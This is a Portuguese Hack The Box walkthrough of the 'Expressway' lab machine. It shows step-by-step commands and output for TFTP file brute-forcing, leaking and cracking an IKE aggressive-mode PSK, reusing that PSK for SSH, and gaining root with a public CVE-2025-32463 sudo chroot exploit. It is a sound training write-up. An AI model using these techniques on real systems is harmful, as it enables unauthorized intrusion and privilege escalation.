---
title: "Hack The Box - Expressway"
author: imendes
date: 2026-01-18
subject: "HTB Walkthrough"
description: "Walkthrough da máquina Expressway (HTB), explorando exposição de TFTP e vazamento de PSK via IKE agressivo para obtenção de acesso inicial e posterior escalada de privilégios via sudo."
keywords: ["HTB", "Expressway", "TFTP", "Cisco", "IKE", "IPSec", "VPN", "CVE-2025-32463", "sudo", "privilege escalation"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: scriptsize
categories: [Hack The Box Machines, Linux, Easy]
---

## Introdução

Este relatório documenta o processo de exploração da máquina **Expressway** da plataforma **Hack The Box**.  
A máquina simula um ambiente de roteador Cisco configurado com VPN IPSec, expondo o serviço **TFTP** que permite a exfiltração de arquivos de configuração. Através do protocolo **IKE (Internet Key Exchange)**, foi possível vazar o hash da chave pré-compartilhada (PSK) utilizando o modo agressivo do protocolo. Após quebrar o hash e obter credenciais SSH, a escalada de privilégios foi realizada explorando a vulnerabilidade **CVE-2025-32463** em uma versão específica do sudo instalada no sistema.  

## Metodologia

A metodologia aplicada seguiu as seguintes fases:

- **Coleta de informações** – identificação de portas TCP e UDP expostas via Nmap.  
- **Enumeração** – brute force de arquivos via TFTP e análise de configurações Cisco.  
- **Exploração** – vazamento de hash PSK através do protocolo IKE em modo agressivo.  
- **Manutenção de acesso** – quebra de hash e autenticação SSH com credenciais obtidas.  
- **Escalada de privilégios** – exploração da CVE-2025-32463 no sudo 1.9.17 para obter root shell.

## Coleta de Informações

### Varredura Nmap TCP

```bash
# Nmap 7.94SVN scan initiated Thu Nov 21 11:34:00 2025 as: nmap -sV -oA nmap 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Varredura Nmap UDP

A varredura UDP revelou serviços críticos adicionais:

```bash
# Nmap 7.94SVN scan initiated Thu Nov 21 11:37:00 2025 as: nmap -sU 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.30s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

**Serviços identificados:**

| Porta    | Protocolo | Serviço         | Observação                                    |
| :------- | :-------- | :-------------- | :-------------------------------------------- |
| 22/tcp   | TCP       | SSH             | OpenSSH 10.0p2 Debian                         |
| 69/udp   | UDP       | TFTP            | Transferência de arquivos trivial             |
| 500/udp  | UDP       | ISAKMP (IKE)    | Negociação de chaves IPSec                    |
| 4500/udp | UDP       | NAT-T IKE       | IKE com NAT traversal                         |

A presença das portas **69 (TFTP)** e **500 (IKE/ISAKMP)** sugere fortemente que o host é um roteador Cisco configurado com VPN IPSec.

## Enumeração

### Exploração do Serviço TFTP

O protocolo **TFTP (Trivial File Transfer Protocol)** é frequentemente utilizado em ambientes de rede para transferência de arquivos de configuração e firmware de dispositivos como roteadores e switches. Por não possuir autenticação, representa um vetor de ataque significativo quando exposto.

Para enumerar arquivos disponíveis no servidor TFTP, foi utilizado o módulo do Metasploit **scanner/tftp/tftpbrute**:

```bash
msf6 > use auxiliary/scanner/tftp/tftpbrute
msf6 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 10.10.11.87
msf6 auxiliary(scanner/tftp/tftpbrute) > run
```

#### Arquivo de Configuração Cisco

O módulo identificou o arquivo **ciscortr.cfg**, que foi recuperado com sucesso:

```bash
tftp 10.10.11.87
tftp> get ciscortr.cfg
Received 2048 bytes in 0.4 seconds
```

A análise do arquivo de configuração revelou informações críticas:

- **Nome de usuário**: `ike`
- **Configuração VPN IPSec**: presença de túneis VPN configurados
- **Domínio**: `expressway.htb`
- **Modo de autenticação**: PSK (Pre-Shared Key)

Estas informações confirmaram que o host opera como um roteador Cisco com VPN IPSec ativa.

## Exploração

### Protocolo IKE e Modo Agressivo

O **IKE (Internet Key Exchange)** é o protocolo responsável pela negociação de chaves criptográficas em conexões VPN IPSec. O protocolo possui dois modos de operação:

- **Main Mode**: realiza seis trocas de mensagens, oferecendo maior segurança ao proteger a identidade dos peers.
- **Aggressive Mode**: realiza apenas três trocas de mensagens, mas expõe informações sensíveis, incluindo o hash da PSK.

O modo agressivo é vulnerável a ataques de captura e quebra offline do hash da chave pré-compartilhada.

### Vazamento do Hash PSK

Utilizando a ferramenta **ike-scan** em modo agressivo, foi possível forçar o servidor a revelar o hash da PSK:

```bash
sudo ike-scan --showbackoff -M -A -P -R 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=be22151b2169736a)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
{LEAKED_HASH}
```

#### Parâmetros da Negociação

O handshake revelou os seguintes parâmetros:

- **Algoritmo de criptografia**: 3DES
- **Algoritmo de hash**: SHA1
- **Grupo Diffie-Hellman**: modp1024 (Group 2)
- **Método de autenticação**: PSK
- **Identificador**: ike@expressway.htb

### Preparação para Quebra de Hash

Para extrair o hash no formato adequado para o hashcat, foi executado:

```bash
sudo ike-scan -M -A 10.10.11.87 --pskcrack=output.txt
```

Este comando gera um arquivo contendo o hash no formato esperado pelo hashcat (modo 5400).

### Quebra do Hash PSK

O hash foi submetido ao **hashcat** utilizando o modo 5400 (IKE PSK) e a wordlist **rockyou.txt**:

```bash
hashcat -m 5400 output.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

A quebra foi bem-sucedida, revelando a chave pré-compartilhada: 
```
{PSK}
```

### Manutenção de Acesso

Considerando que o nome de usuário **ike** foi identificado no arquivo de configuração Cisco e na identidade IKE, foi testada a reutilização da senha PSK para autenticação SSH:

```bash
ssh ike@10.10.11.87
Password: {PSK}
```

A autenticação foi bem-sucedida, garantindo acesso ao sistema como usuário **ike**.

Flag de usuário recuperada:

```bash
ike@expressway:~$ cat user.txt
```

## Escalada de Privilégios

### Enumeração de Versões do Sudo

Durante a enumeração do sistema, foi identificada uma configuração atípica: duas instalações distintas do sudo no sistema:

```bash
ike@expressway:~$ which -a sudo
/usr/local/bin/sudo
/usr/bin/sudo
```

Verificando a versão padrão resolvida pelo PATH:

```bash
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 53
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

A versão **1.9.17** localizada em `/usr/local/bin/sudo` é prioritária no PATH e vulnerável à **CVE-2025-32463**.


### Vulnerabilidade CVE-2025-32463

A **CVE-2025-32463** é uma vulnerabilidade no sudo versão 1.9.17 que permite execução de comandos como root através da opção `--chroot`, mesmo quando o usuário não está listado no arquivo sudoers. A falha decorre de validações inadequadas no processamento da opção `--chroot`, permitindo que usuários sem privilégios sudo escalem privilégios.

#### Exploração

Foi utilizada a PoC disponível publicamente:

**Repositório**: [https://github.com/kh4sh3i/CVE-2025-32463](https://github.com/kh4sh3i/CVE-2025-32463)

O exploit é transferido por copia, e executando o exploit:

```bash
ike@expressway:~$ cd /tmp
ike@expressway:/tmp$ vi exploit
ike@expressway:/tmp$ chmod +x exploit
ike@expressway:/tmp$ ./exploit
woot!
root@expressway:/#
```
Isso permitiu com que a flag de sistema fosse obtida.


## Referências

- [ike-scan - IKE/IPSec VPN Scanner](https://github.com/royhills/ike-scan)
- [CVE-2025-32463 PoC - Sudo Privilege Escalation](https://github.com/kh4sh3i/CVE-2025-32463)
- [TFTP Security Considerations](https://tools.ietf.org/html/rfc1350)
